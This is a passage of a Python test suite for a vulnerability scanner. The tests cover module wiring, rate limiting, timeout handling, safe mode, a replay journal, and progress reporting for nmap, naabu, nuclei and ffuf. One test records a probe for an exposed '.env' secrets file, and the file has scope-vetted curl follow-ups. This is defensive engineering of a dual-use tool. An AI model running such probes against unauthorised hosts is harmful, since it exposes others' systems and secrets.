            tree = ast.parse(f.read_text(encoding="utf-8"), filename=str(f))
            for node in ast.walk(tree):
                if not isinstance(node, ast.Call):
                    continue
                for kw in node.keywords:
                    if kw.arg != "shell":
                        continue
                    if isinstance(kw.value, ast.Constant) and kw.value.value:
                        offenders.append("%s:%d" % (f.name, node.lineno))
        self.assertEqual(offenders, [])


class WiringTests(unittest.TestCase):
    """Guards against the failure mode where a feature exists but never runs.

    Each of these caught a real gap: content discovery was documented and
    installable but never invoked, and four tools were installed on every
    machine for nothing.
    """

    def test_every_module_stage_is_one_the_engine_runs(self):
        import inspect
        from assay import engine
        from assay.modules import STAGES, all_modules
        src = inspect.getsource(engine.Engine.run)
        executed = {s for s in STAGES if '_stage_modules("%s")' % s in src}
        # the probe stage is invoked from run() as well
        declared = {m.stage for m in all_modules()}
        orphans = sorted(declared - executed)
        self.assertEqual(orphans, [],
                         "modules registered at stages the engine never runs: %s"
                         % orphans)

    def test_every_registered_tool_is_actually_used(self):
        """A tool in the registry gets installed and advertised by doctor."""
        import pathlib
        from assay import tools
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        blob = "\n".join(f.read_text(encoding="utf-8")
                          for f in root.rglob("*.py") if f.name != "tools.py")
        toolsrc = (root / "tools.py").read_text(encoding="utf-8")
        unused = []
        for name, spec in tools.REGISTRY.items():
            if spec.binary == "__wordlist__":
                continue
            slug = name.replace("-", "_").replace(".", "")
            # used if a wrapper for it is called outside tools.py, or the binary
            # name appears in an argv list built anywhere
            wrapper_used = any(("%s_" % slug) in blob for _ in (0,)) and \
                any(w in blob for w in (slug + "_scan", slug + "_probe",
                                        slug + "_crawl", slug + "_urls",
                                        slug + "_params", slug + "_enum",
                                        slug + "_resolve", slug + "_discover"))
            argv_used = ('"%s"' % spec.binary) in blob
            helper_defined = ('"%s"' % spec.binary) in toolsrc
            if not (wrapper_used or argv_used or
                    (helper_defined and slug in blob)):
                unused.append(name)
        self.assertEqual(unused, [],
                         "registered but never invoked: %s" % unused)

    def test_profile_options_are_all_read(self):
        import pathlib
        from assay.config import PROFILES
        root = pathlib.Path(__file__).resolve().parent.parent / "assay"
        blob = "\n".join(f.read_text(encoding="utf-8") for f in root.rglob("*.py"))
        unread = [k for k in PROFILES["standard"]
                  if 'opts.get("%s"' % k not in blob and 'opts["%s"]' % k not in blob]
        self.assertEqual(unread, [], "profile options never read: %s" % unread)

    def test_content_discovery_module_is_registered(self):
        from assay.modules import all_modules
        self.assertIn("content", [m.name for m in all_modules()])


class PacingTests(unittest.TestCase):
    def test_backoff_halves_and_recovers_to_the_ceiling(self):
        from assay.net import RateLimiter
        l = RateLimiter(20)
        self.assertEqual(l.back_off(), 10.0)
        self.assertEqual(l.back_off(), 5.0)
        for _ in range(20):
            l.recover()
        self.assertEqual(l.rate, 20)
        self.assertEqual(l.throttled, 2)

    def test_backoff_has_a_floor(self):
        from assay.net import RateLimiter
        l = RateLimiter(20)
        for _ in range(50):
            l.back_off()
        self.assertGreaterEqual(l.rate, 0.5)

    def test_per_host_limiter_is_separate_from_global(self):
        from assay.config import Config
        from assay.net import HttpClient
        c = HttpClient(Config(rate=100, rate_per_host=5))
        a, b = c._host_limiter("a.test"), c._host_limiter("b.test")
        self.assertIsNot(a, b)
        self.assertEqual(a.base_rate, 5)
        self.assertIs(a, c._host_limiter("a.test"))

    def test_per_host_limiting_can_be_disabled(self):
        from assay.config import Config
        from assay.net import HttpClient
        self.assertIsNone(HttpClient(Config(rate_per_host=0))._host_limiter("a.test"))


class _FakeRawStream:
    """Stands in for r.raw: .read() either raises or returns a fixed body."""

    def __init__(self, body: bytes = b"", raises=None):
        self.body = body
        self.raises = raises
        self.read_calls = 0

    def read(self, n, decode_content=True):
        self.read_calls += 1
        if self.raises is not None:
            raise self.raises
        return self.body


class _FakeResponse:
    """Stands in for what session.request(..., stream=True) returns."""

    def __init__(self, raw: "_FakeRawStream", status=200):
        self.raw = raw
        self.status_code = status
        self.headers = {}
        self.url = "http://10.0.0.1/"
        self.history = []
        self.encoding = "utf-8"
        self.closed = 0

    def close(self):
        self.closed += 1


class _FakeSession:
    """Replaces HttpClient._session(). Hands back one canned response per call."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = 0

    def request(self, method, url, **kw):
        self.calls += 1
        return self.responses.pop(0)


class HttpClientRawReadTimeoutTests(unittest.TestCase):
    """r.raw.read() bypasses requests' own exception translation.

    A body that stops answering mid-stream raises urllib3.exceptions.
    ReadTimeoutError (or ProtocolError), confirmed by direct reproduction
    against a real socket - and that is not a requests.RequestException, so
    catching only the latter let it escape uncaught. It surfaced several
    layers up, several stages removed from HttpClient, as a bare
    "ReadTimeoutError" that made a scan with many black-holing hosts read as
    having died in the middle of the probe stage rather than losing one slow
    candidate.
    """

    def _client(self, session):
        from assay.config import Config
        from assay.net import HttpClient
        c = HttpClient(Config())
        c._session = lambda: session
        return c

    def test_a_read_timeout_is_caught_not_propagated(self):
        import urllib3
        raw = _FakeRawStream(raises=urllib3.exceptions.ReadTimeoutError(
            None, "http://10.0.0.1/", "Read timed out."))
        session = _FakeSession([_FakeResponse(raw), _FakeResponse(raw)])
        resp = self._client(session).get("http://10.0.0.1/")
        self.assertEqual(resp.status, 0)
        self.assertIn("ReadTimeoutError", resp.error)

    def test_the_connection_is_still_closed_on_a_raised_read(self):
        """Reached via r.raw.read() directly, so close() is not automatic."""
        import urllib3
        raw = _FakeRawStream(raises=urllib3.exceptions.ReadTimeoutError(
            None, "http://10.0.0.1/", "Read timed out."))
        first = _FakeResponse(raw)
        second = _FakeResponse(raw)
        session = _FakeSession([first, second])
        self._client(session).get("http://10.0.0.1/")
        self.assertEqual(first.closed, 1, "a leaked connection empties an 8-slot pool")
        self.assertEqual(second.closed, 1)

    def test_a_timeout_on_the_first_attempt_still_retries(self):
        """Escaping the except clause meant no retry at all, not just no logging."""
        import urllib3
        bad = _FakeRawStream(raises=urllib3.exceptions.ProtocolError("Connection broken"))
        good = _FakeRawStream(body=b"hello")
        session = _FakeSession([_FakeResponse(bad), _FakeResponse(good)])
        resp = self._client(session).get("http://10.0.0.1/")
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.body, "hello")
        self.assertEqual(session.calls, 2)

    def test_a_clean_read_is_unaffected(self):
        raw = _FakeRawStream(body=b"ok")
        session = _FakeSession([_FakeResponse(raw)])
        resp = self._client(session).get("http://10.0.0.1/")
        self.assertEqual(resp.status, 200)
        self.assertEqual(resp.body, "ok")


class ImpactClassTests(unittest.TestCase):
    def test_every_module_declares_a_valid_class(self):
        from assay.modules import IMPACT_CLASSES, all_modules
        bad = [(m.name, m.impact_class) for m in all_modules()
               if m.impact_class not in IMPACT_CLASSES]
        self.assertEqual(bad, [])

    def test_safe_mode_admits_only_retrieval_modules(self):
        from assay.config import Config
        from assay.context import Context
        from assay.modules import all_modules

        class _S:
            def add_finding(self, f): return True
        cfg = Config(safe_mode=True)
        ctx = Context(cfg=cfg, store=_S(), http=None, tune={})
        allowed = [m.name for m in all_modules() if m.applicable(ctx)]
        classes = {m.impact_class for m in all_modules() if m.name in allowed}
        self.assertTrue(classes <= {"passive", "read"},
                        "safe mode admitted a probing module: %s" % classes)
        self.assertIn("exposure", allowed)
        self.assertNotIn("sqli", allowed)
        self.assertNotIn("content", allowed)

    def test_normal_mode_admits_probing_modules(self):
        from assay.config import Config
        from assay.context import Context
        from assay.modules import all_modules

        class _S:
            def add_finding(self, f): return True
        ctx = Context(cfg=Config(), store=_S(), http=None, tune={})
        allowed = [m.name for m in all_modules() if m.applicable(ctx)]
        self.assertIn("sqli", allowed)


class JournalTests(unittest.TestCase):
    def test_requests_and_commands_become_replayable(self):
        import tempfile, os
        from assay.journal import Journal
        d = tempfile.mkdtemp()
        j = Journal(d)
        j.open(["target.test"], "standard")
        j.request("GET", "https://target.test/.env", {"X-Api-Key": "abc"})
        j.command(["nmap", "-sV", "10.0.0.1"])
        j.close()
        log = open(j.log_path).read()
        replay = open(j.replay_path).read()
        self.assertIn("https://target.test/.env", log)
        self.assertIn("nmap -sV 10.0.0.1", log)
        self.assertIn("curl -sSik", replay)
        self.assertIn("nmap -sV 10.0.0.1", replay)
        self.assertTrue(os.access(j.replay_path, os.X_OK))

    def test_identical_requests_are_recorded_once_in_replay(self):
        import tempfile
        from assay.journal import Journal
        j = Journal(tempfile.mkdtemp())
        j.open(["t"], "quick")
        for _ in range(5):
            j.request("GET", "https://t/x", {})
        j.close()
        self.assertEqual(open(j.replay_path).read().count("https://t/x"), 1)
        self.assertEqual(j.requests, 5)

    def test_disabled_journal_writes_nothing(self):
        import tempfile, os
        from assay.journal import Journal
        d = tempfile.mkdtemp()
        j = Journal(d, enabled=False)
        j.open(["t"], "quick"); j.request("GET", "https://t/", {}); j.close()
        self.assertFalse(os.path.exists(j.log_path))


class ScanProgressTests(unittest.TestCase):
    """A stage that reports nothing looks exactly like a stage that hung."""

    def test_duration_is_readable_past_a_minute(self):
        from assay.tools import human_duration
        self.assertEqual(
            [human_duration(x) for x in (0, 9, 63, 763, 4000)],
            ["0s", "9s", "1m03s", "12m43s", "1h06m"])

    def test_stage_clock_resets_on_a_new_stage(self):
        import time
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("resolve", "x")
        first = d.stage_started
        time.sleep(0.01)
        d.progress("resolve", "still resolving", advance=1)
        self.assertEqual(d.stage_started, first, "same stage must not reset the clock")
        d.progress("ports", "sweeping")
        self.assertGreater(d.stage_started, first, "new stage must reset the clock")

    def test_status_reports_stage_and_detail(self):
        from assay.ui import Dashboard
        d = Dashboard(1, "standard", quiet=True)
        d.progress("ports", "naabu: 3 open port(s) on 2 host(s) so far", advance=1)
        st = d.status()
        self.assertEqual(st["stage"], "ports")
        self.assertIn("naabu:", st["detail"])
        self.assertRegex(st["stage_elapsed"], r"^\d+(s|m\d\ds|h\d\dm)$")
        self.assertNotIn("elapsed", st,
                         "the whole-scan clock belongs to assets, not here")

    def test_nmap_stats_lines_become_progress(self):
        from assay.tools import nmap_stat_line
        self.assertEqual(
            nmap_stat_line("Service Scan Timing: About 45.23% done; "
                           "ETC: 14:05 (0:03:12 remaining)"),
            "45.23% done, 0:03:12 remaining")
        self.assertEqual(nmap_stat_line("SYN Stealth Scan Timing: About 9.80% done"),
                         "9.80% done")
        self.assertEqual(
            nmap_stat_line("Stats: 0:00:30 elapsed; 120 hosts completed (384 up), "
                           "264 undergoing Service Scan"),
            "120 host(s) completed")

    def test_a_non_stats_line_is_not_progress(self):
        from assay.tools import nmap_stat_line
        for line in ("Nmap scan report for 10.0.0.1", "", "Host is up (0.0011s latency)."):
            self.assertIsNone(nmap_stat_line(line), line)

    def test_naabu_still_collects_every_streamed_result(self):
        """Progress moved to stream_lines; naabu's own collection must not have."""
        from assay import tools
        original = tools.stream_json
        tools.stream_json = lambda *a, **k: iter(
            [{"host": "10.0.0.%d" % i, "port": 80 + i} for i in range(4)])
        try:
            out = tools.naabu_scan(["10.0.0.1"], "top-100", {})
        finally:
            tools.stream_json = original
        self.assertEqual(len(out), 4, "every streamed result must still be collected")

    def _live_bar(self, **build_kw):
        """Render a live report and return just its status bar."""
        import re, tempfile
        from assay import report
        from assay.store import Store
        self.tmp = tempfile.mkdtemp()
        st = Store(os.path.join(self.tmp, "a.db"))
        st.start_run("standard", ["10.0.0.0/24"])
        self.addCleanup(st.close)
        path = report.build(st, build_kw.pop("assets", {"hosts": 1, "web": 0,
                                                        "requests": 0}),
                            os.path.join(self.tmp, "r.html"), live=True, **build_kw)
        with open(path) as fh:
            return re.search(r'<div class="livebar".*?</div>', fh.read(), re.S).group(0)

    def test_live_report_bar_shows_where_the_scan_is(self):
        bar = self._live_bar(
            assets={"hosts": 1, "web": 0, "requests": 0, "duration": 763.0},
            status={"stage": "ports", "detail": "nmap: 45% done",
                    "stage_elapsed": "11m02s"})
        self.assertIn("ports", bar)
        self.assertIn("nmap: 45% done", bar)
        self.assertIn("11m02s", bar)

    def test_the_bar_and_the_header_show_one_scan_clock(self):
        """Both read assets["duration"], so they cannot disagree."""
        bar = self._live_bar(
            assets={"hosts": 1, "web": 0, "requests": 0, "duration": 763.0},
            status={"stage": "ports", "detail": "", "stage_elapsed": "11m02s"})
        self.assertIn("total 12m43s", bar)

    def test_live_report_without_status_still_renders(self):
        self.assertIn("scan running", self._live_bar())


class ReportFileCacheTests(unittest.TestCase):
    """The live report rebuilds every few seconds for the whole scan."""

    def setUp(self):
        import tempfile
        from assay import report
        from assay.store import Store
        report._FILE_BLOCKS.clear()
        self.addCleanup(report._FILE_BLOCKS.clear)
        self.out = tempfile.mkdtemp()
        os.makedirs(os.path.join(self.out, "raw"))
        self.st = Store(os.path.join(self.out, "a.db"))
        self.st.start_run("standard", ["10.0.0.0/24"])
        self.addCleanup(self.st.close)
        self.xml = os.path.join(self.out, "raw", "nmap.xml")
        with open(self.xml, "w") as fh:
            fh.write("<nmaprun>" + ("<host><address addr='10.0.0.1'/></host>" * 2000)
                     + "</nmaprun>")

    def _build_counting_reads(self, times=1):
        import builtins
        from assay import report
        reads = [0]
        original = builtins.open

        def counting(path, *a, **k):
            if str(path).endswith("nmap.xml"):
                reads[0] += 1
            return original(path, *a, **k)

        builtins.open = counting
        try:
            for _ in range(times):
                report.build(self.st, {"hosts": 1, "web": 0, "requests": 0},
                             os.path.join(self.out, "r.html"), live=True)
        finally:
            builtins.open = original
        return reads[0]

    def test_the_xml_is_read_once_across_many_rebuilds(self):
        self.assertEqual(self._build_counting_reads(times=8), 1,
                         "an unchanged file must not be re-read per refresh")

    def test_a_new_nmap_run_invalidates_the_cache(self):
        import time
        self._build_counting_reads(times=2)
        time.sleep(0.01)
        with open(self.xml, "a") as fh:
            fh.write("<!-- a second nmap invocation -->")
        self.assertEqual(self._build_counting_reads(times=1), 1,
                         "a changed file must be re-read")

    def test_the_rendered_block_still_appears(self):
        from assay import report
        path = report.build(self.st, {"hosts": 1, "web": 0, "requests": 0},
                            os.path.join(self.out, "r.html"), live=True)
        with open(path) as fh:
            html = fh.read()
        self.assertIn("nmap.xml", html)
        self.assertIn("&lt;nmaprun&gt;", html, "content is still escaped")

    def test_a_missing_file_is_not_cached_as_empty(self):
        """None means absent; a file appearing later must render."""
        from assay import report
        missing = os.path.join(self.out, "raw", "nmap-extra.xml")
        self.assertIsNone(report._by_file_version(missing, lambda: "x"))
        with open(missing, "w") as fh:
            fh.write("<nmaprun/>")
        self.assertEqual(report._by_file_version(missing, lambda: "x"), "x")


class ReportQueryCountTests(unittest.TestCase):
    """Rendering asked the database three questions per finding."""

    def _store(self, n_findings=40):
        import os, tempfile
        from assay.store import Store
        from assay.models import Finding
        self.out = tempfile.mkdtemp()
        st = Store(os.path.join(self.out, "a.db"))
        st.start_run("standard", ["10.0.0.0/24"])
        self.addCleanup(st.close)
        for i in range(n_findings):
            f = Finding(title="f%d" % i, target="10.0.0.%d" % i,
                        severity="medium", confidence="firm", module="m",
                        category="A01", cwe="CWE-1", impact="i", detail="d",
                        repro="r", dedupe_key="k%d" % i)
            f.compute_score()
            st.add_finding(f)
        return st

    def _statements_for_build(self, st):
        import os
        from assay import report
        n = [0]
        st._conn.set_trace_callback(lambda stmt: n.__setitem__(0, n[0] + 1))
        try:
            report.build(st, {"hosts": 1, "web": 0, "requests": 0},
                         os.path.join(self.out, "r.html"))
        finally:
            st._conn.set_trace_callback(None)
        return n[0]

    def test_query_count_does_not_grow_with_findings(self):
        small = self._statements_for_build(self._store(10))
        big = self._statements_for_build(self._store(200))
        self.assertEqual(small, big,
                         "report cost must not scale with the finding count")
        self.assertLess(big, 20, "a build should be a handful of queries")

    def test_a_stored_finding_keeps_its_identity(self):
        """dedupe_key has no column, so fingerprint() must not recompute."""
        from assay.models import Finding
        st = self._store(0)
        f = Finding(title="t", target="x", severity="medium", confidence="firm",
                    module="m", category="A01", cwe="", impact="i", detail="d",
                    repro="r", dedupe_key="ssrf-oob|/path|url")
        f.compute_score()
        st.add_finding(f)
        self.assertEqual(st.findings()[0].fingerprint(), f.fingerprint(),
                         "a round-tripped finding must match its own row")

    def test_ai_verdicts_reach_a_finding_read_back_from_the_store(self):
        from assay.models import Finding
        st = self._store(0)
        f = Finding(title="t", target="x", severity="medium", confidence="firm",
                    module="m", category="A01", cwe="", impact="i", detail="d",
                    repro="r", dedupe_key="k|/p|u")
        f.compute_score()
        st.add_finding(f)
        st.save_ai({"triage": [
            {"id": f.fingerprint(), "verdict": "report", "priority": 1,
             "false_positive_risk": "low", "rationale": "r",
             "impact_statement": "i", "next_steps": ["s"], "commands": ["c"]}]})
        stored = st.findings()[0]
        self.assertIsNotNone(st.ai_map().get(stored.fingerprint()),
                             "the verdict must render on the card")

    def test_ai_map_matches_ai_for(self):
        st = self._store(3)
        fids = [f.fingerprint() for f in st.findings()]
        st.save_ai({"triage": [
            {"id": fids[0], "verdict": "report", "priority": 1,
             "false_positive_risk": "low", "rationale": "r",
             "impact_statement": "i", "next_steps": ["s"], "commands": ["c"]}]})
        by_fid = st.ai_map()
        self.assertEqual(by_fid.get(fids[0]), st.ai_for(fids[0]))
        self.assertIsNone(by_fid.get(fids[1]))

    def test_new_badging_uses_the_run_the_finding_came_from(self):
        st = self._store(2)
        for f in st.findings():
            self.assertEqual(f.run_id, st.run_id, "written by the current run")
        st.finish_run()
        st.start_run("standard", ["10.0.0.0/24"])
        for f in st.findings():
            self.assertNotEqual(f.run_id, st.run_id,
                                "carried over from the previous run")

    def test_status_comes_off_the_row(self):
        st = self._store(1)
        fid = st.findings()[0].fingerprint()
        st.set_status(fid, "reported")
        self.assertEqual(st.findings()[0].status, "reported")


class BridgeCoverageTests(unittest.TestCase):
    """tools.bridge() only reaches commands that go through run/stream_lines.

    On a Windows host the whole toolchain lives inside WSL, so a spawn that
    skips the bridge fails for exactly the binaries the engine runs fine.
    """

    def test_only_tools_and_env_spawn_processes(self):
        """env.py implements the bridge; ai.py is documented as unbridged."""
        import pathlib as _p
        root = _p.Path(__file__).resolve().parent.parent / "assay"
        offenders = []
        for f in root.rglob("*.py"):
            if f.name in ("tools.py", "env.py", "ai.py"):
                continue
            if "subprocess." in f.read_text(encoding="utf-8"):
                offenders.append(str(f.relative_to(root)))
        self.assertEqual(offenders, [],
                         "these spawn without the WSL bridge or the journal")

    def test_dns_lookup_goes_through_run(self):
        from assay import tools
        seen = []
        original = tools.run
        tools.run = lambda cmd, **k: (seen.append(list(cmd)),
                                      tools.Proc(rc=0, out="", err="",
                                                 cmd=list(cmd)))[1]
        try:
            tools.dns_lookup("NS", "example.com")
        finally:
            tools.run = original
        self.assertEqual(seen[0][0], "dig")
        self.assertEqual(seen[1][0], "host", "host is the fallback")

    def test_dns_lookup_keeps_output_from_a_nonzero_exit(self):
        """`host` exits non-zero on NXDOMAIN but prints the reason."""
        from assay import tools
        original = tools.run
        tools.run = lambda cmd, **k: tools.Proc(
            rc=0 if cmd[0] == "dig" else 1,
            out="" if cmd[0] == "dig" else "Host x not found: 3(NXDOMAIN)",
            err="", cmd=list(cmd))
        try:
            self.assertIn("NXDOMAIN", tools.dns_lookup("NS", "x.invalid"))
        finally:
            tools.run = original

    def test_followup_executes_through_tools_run(self):
        from assay import followup, tools
        from assay.config import Config, Scope
        seen = []
        original = tools.run
        tools.run = lambda cmd, **k: (seen.append(list(cmd)),
                                      tools.Proc(rc=0, out="ok", err="",
                                                 cmd=list(cmd)))[1]
        try:
            cfg = Config(targets=["app.test"], scope=Scope(allow=["app.test"]))
            cmd = followup.vet("curl -s https://app.test/x", cfg)
            self.assertTrue(cmd.ok, cmd.reason)
            followup.run(cmd)
        finally:
            tools.run = original
        self.assertEqual(seen, [["curl", "-s", "https://app.test/x"]])

    def test_env_extra_crosses_the_bridge_as_an_env_prefix(self):
        """Windows environment does not reach the distribution."""
        from assay import env, tools
        saved_use, saved_pre = env.use_wsl_bridge, env.wsl_prefix
        env.use_wsl_bridge = lambda: True
        env.wsl_prefix = lambda: ["wsl.exe", "-d", "kali", "--"]
        try:
            argv = ["env", "GOFLAGS=-x"] + ["go", "install", "x"]
            self.assertEqual(
                tools.bridge(argv),
                ["wsl.exe", "-d", "kali", "--", "env", "GOFLAGS=-x",
                 "go", "install", "x"])
        finally:
            env.use_wsl_bridge, env.wsl_prefix = saved_use, saved_pre


class ProbeNonLiveEndpointTests(unittest.TestCase):
    """A proxy with no backend used to kill the run on the native probe path.

    engine._probe_one reached for ctx.journal, which Context does not have, so
    the AttributeError came out of the worker and through an unguarded
    fut.result() in _stage_probe. gateway.looks_live rejects an empty 502, so
    the first such endpoint ended the scan.
    """

    def _engine(self, resp):
        import tempfile, types
        from assay.config import Config
        from assay.engine import Engine
        self.out = tempfile.mkdtemp()
        eng = Engine(Config(targets=["10.0.0.5"], out_dir=self.out, journal=True))
        eng.journal.open(["10.0.0.5"], "standard")
        self.addCleanup(eng.journal.close)
        eng.http = types.SimpleNamespace(get=lambda *a, **k: resp)
        eng.ctx.http = eng.http
        return eng

    class _Resp:
        ok = True
        status = 502
        title = ""
        url = "http://10.0.0.5:80/"
        body = ""
        content_type = "text/html"
        headers: dict = {}
        history: list = []

        def header(self, name):
            return ""

    def test_a_dead_proxy_response_does_not_raise(self):
        from assay.models import Target, Port
        eng = self._engine(self._Resp())
        self.assertIsNone(
            eng._probe_one(Target(raw="10.0.0.5", host="10.0.0.5"), Port(port=80)),
            "a non-live endpoint yields no WebTarget")

    def test_the_reason_is_journaled(self):
        import os
        from assay.models import Target, Port
        eng = self._engine(self._Resp())
        eng._probe_one(Target(raw="10.0.0.5", host="10.0.0.5"), Port(port=80))
        eng.journal.close()
        with open(os.path.join(self.out, "activity.log")) as fh:
            self.assertIn("not a service", fh.read())

    def test_context_still_has_no_journal(self):
        """Guards the instinct that caused this: ctx is not the journal's home."""
        from assay.context import Context
        self.assertNotIn("journal", Context.__dataclass_fields__)


class ApexDerivationTests(unittest.TestCase):
    """A bare last-two-labels slice turns every *.co.uk target into "co.uk"."""

    def test_multi_part_tlds_do_not_collapse_to_the_tld(self):
        from assay.correlate import _apex
        self.assertEqual(_apex("app.acme.co.uk"), "acme.co.uk")
        self.assertEqual(_apex("www.shop.com.au"), "shop.com.au")

    def test_ordinary_hosts_are_unchanged(self):
        from assay.correlate import _apex
        self.assertEqual(_apex("a.b.example.com"), "example.com")
        self.assertEqual(_apex("example.com"), "example.com")

    def test_addresses_and_single_labels_fall_back_to_the_host(self):
        from assay.correlate import _apex
        self.assertEqual(_apex("10.0.0.5"), "10.0.0.5")
        self.assertEqual(_apex("localhost"), "localhost")


class TargetCountTests(unittest.TestCase):
    """The header counts specs until the specs have been expanded."""

    def test_a_cidr_spec_counts_as_its_hosts_once_resolved(self):
        from assay.ui import Dashboard
        from assay.models import Target
        dash = Dashboard(1, "standard", quiet=True)      # one spec: a /22
        self.assertEqual(dash.targets, 1)
        resolved = [Target(raw="10.0.0.0/22", host="10.0.0.%d" % i)
                    for i in range(1024)]
        dash.targets = len(resolved) or dash.targets
        self.assertEqual(dash.targets, 1024,
                         "the header must count what is actually scanned")

    def test_the_spec_count_survives_until_expansion(self):
        from assay.ui import Dashboard
        dash = Dashboard(55, "standard", quiet=True)
        dash.targets = len([]) or dash.targets          # before resolve runs
        self.assertEqual(dash.targets, 55)


@contextlib.contextmanager
def _fast_heartbeat(every=0.05):
    from assay import tools
    original = tools.HEARTBEAT
    tools.HEARTBEAT = every
    try:
        yield
    finally:
        tools.HEARTBEAT = original


class ToolProgressSinkTests(unittest.TestCase):
    """A tool that works quietly for ten minutes must not look like a hang.

    Progress is ambient - installed once on assay.tools - so it covers every
    external command, including the ones whose wrappers never asked for it.
    """

    def test_a_silent_streaming_tool_still_reports(self):
        """nuclei can go minutes between matches. That silence was the bug."""
        from assay import tools
        told = []
        with _sink(told), _fast_heartbeat():
            list(tools.stream_lines(["bash", "-c", "sleep 0.4"], timeout=30.0))
        ticks = [m for m, tick in told if tick]
        self.assertTrue(ticks, "a tool that says nothing must still be reported")
        self.assertTrue(all(m.startswith("bash: running ") for m in ticks), ticks)

    def test_a_blocking_tool_reports_too(self):
        """ffuf buffers everything to a file, so its clock is all there is."""
        from assay import tools
        told = []
        with _sink(told), _fast_heartbeat():
            tools.run(["bash", "-c", "sleep 0.4"], timeout=30.0)
        self.assertTrue([m for m, tick in told if tick],
                        "run() is a spawn primitive too")

    def test_a_quick_command_says_nothing(self):
        """Hundreds of DNS lookups per run: they must not narrate themselves."""
        from assay import tools
        told = []
        with _sink(told):          # the real 5s cadence
            tools.run(["bash", "-c", "true"], timeout=30.0)
            list(tools.stream_lines(["bash", "-c", "echo a"], timeout=30.0))
        self.assertEqual(told, [])

    def test_the_heartbeat_carries_what_has_turned_up(self):
        from assay import tools
        told = []
        with _sink(told), _fast_heartbeat():
            list(tools.stream_lines(
                ["bash", "-c", "echo a; echo b; echo c; sleep 0.4"], timeout=30.0))
        self.assertTrue(any("3 result(s) so far" in m for m, _ in told), told)

    def test_nmap_is_the_tool_whose_stdout_is_read_as_status(self):
        from assay import tools
        self.assertIs(tools._LINE_STATUS.get("nmap"), tools.nmap_stat_line)

    def test_a_registered_parser_replaces_the_result_count(self):
        """nmap's lines are progress; counting them would report nonsense."""
        from assay import tools
        told = []
        line = ("Stats: 0:00:30 elapsed; 120 hosts completed (384 up), "
                "264 undergoing Service Scan")
        tools._LINE_STATUS["bash"] = tools.nmap_stat_line
        try:
            with _sink(told), _fast_heartbeat():
                list(tools.stream_lines(
                    ["bash", "-c", "echo \"%s\"; sleep 0.4" % line], timeout=30.0))
        finally:
            del tools._LINE_STATUS["bash"]
        self.assertTrue(any("120 host(s) completed" in m for m, _ in told), told)
        self.assertFalse(any("result(s)" in m for m, _ in told), told)

    def test_a_failed_spawn_leaves_no_heartbeat_running(self):
        import time
        from assay import tools
        told = []
        with _sink(told), _fast_heartbeat():
            list(tools.stream_lines(["definitely-not-a-real-binary-xyz"], timeout=30.0))
            time.sleep(0.2)
        self.assertEqual([m for m, tick in told if tick], [],
                         "nothing is running, so nothing should report running")


@contextlib.contextmanager
def _skip_after(delay):
    """Set tools.SKIP from a background thread after `delay`s, mimicking the
    operator's key press arriving mid-call. Always clears it afterward -
    SKIP is a module-level singleton, so a test that left it set would leak
    into whichever test runs next."""
    import threading
    from assay import tools
    timer = threading.Timer(delay, tools.SKIP.set)
    timer.start()
    try:
        yield
    finally:
        timer.cancel()
        tools.SKIP.clear()


class SkipRunTests(unittest.TestCase):
    """tools.run() (ffuf's own primitive): a single blocking subprocess.run()
    call with no line-by-line read loop of its own to check anything mid-
    flight - the case that motivated binding the heartbeat to a real Popen
    instead of just timing subprocess.run()."""

    CHATTY = ["bash", "-c", "sleep 5"]

    def tearDown(self):
        from assay import tools
        tools.SKIP.clear()

    def test_a_skip_mid_call_cuts_it_short(self):
        import time
        from assay import tools
        told = []
        t = time.time()
        with _sink(told), _fast_heartbeat(), _skip_after(0.15):
            p = tools.run(self.CHATTY, timeout=30.0)
        self.assertLess(time.time() - t, 5.0, "must not wait out the full sleep")
        self.assertTrue(p.skipped)
        self.assertFalse(p.ok)
        self.assertTrue(any("skipped" in m for m, _tick in told), told)

    def test_a_skip_already_set_is_honoured_before_spawning(self):
        """No wait at all - and nothing to clean up, since nothing started."""
        import time
        from assay import tools
        told = []
        tools.SKIP.set()
        t = time.time()
        with _sink(told):
            p = tools.run(self.CHATTY, timeout=30.0)
        self.assertLess(time.time() - t, 1.0)
        self.assertTrue(p.skipped)
        self.assertEqual(p.err, "skipped by operator")

    def test_no_skip_runs_normally(self):
        from assay import tools
        p = tools.run(["bash", "-c", "echo hi"], timeout=30.0)
        self.assertTrue(p.ok)
        self.assertFalse(p.skipped)
        self.assertEqual(p.out.strip(), "hi")


class SkipStreamLinesTests(unittest.TestCase):
    """stream_lines(): both a silent tool (only the heartbeat thread can
    notice) and a chatty one (the per-line check can notice sooner)."""

    def tearDown(self):
        from assay import tools
        tools.SKIP.clear()

    def test_a_silent_tool_is_cut_short_by_the_heartbeat_thread(self):
        import time
        from assay import tools
        told = []
        t = time.time()
        with _sink(told), _fast_heartbeat(), _skip_after(0.15):
            out = list(tools.stream_lines(["bash", "-c", "sleep 5"], timeout=30.0))
        self.assertLess(time.time() - t, 5.0)
        self.assertEqual(out, [])
        self.assertTrue(any("skipped" in m for m, _tick in told), told)

    def test_a_chatty_tool_notices_between_two_lines(self):
        """The heartbeat thread only spawns with a progress sink installed
        (see _Heartbeat.start()) - always true in a real scan, since Engine
        sets one unconditionally, but this test needs _sink() to match."""
        from assay import tools
        script = "for i in $(seq 1 100); do echo x; sleep 0.05; done"
        with _sink([]), _fast_heartbeat(), _skip_after(0.15):
            out = list(tools.stream_lines(["bash", "-c", script], timeout=30.0))
        self.assertLess(len(out), 100, "must have been cut short, not run to completion")

    def test_a_skip_already_set_yields_nothing_and_does_not_spawn(self):
        from assay import tools
        tools.SKIP.set()
        out = list(tools.stream_lines(["bash", "-c", "echo should-not-appear"], timeout=30.0))
        self.assertEqual(out, [])

    def test_a_skipped_run_is_not_logged_as_a_generic_failure(self):
        """A negative returncode from our own SIGTERM must not read as the
        tool having crashed - it was told to stop, not that it broke."""
        from assay import tools
        recs = []
        original = tools._record_failure
        tools._record_failure = lambda cmd, err: recs.append(str(err))
        try:
            with _fast_heartbeat(), _skip_after(0.15):
                list(tools.stream_lines(["bash", "-c", "sleep 5"], timeout=30.0))
        finally:
            tools._record_failure = original
        self.assertEqual(recs, [])

    def test_no_skip_streams_normally(self):
        from assay import tools
        out = list(tools.stream_lines(["bash", "-c", "echo a; echo b"], timeout=30.0))
        self.assertEqual(out, ["a", "b"])


class ProcOkTests(unittest.TestCase):
    def test_skipped_is_not_ok(self):
        from assay.tools import Proc
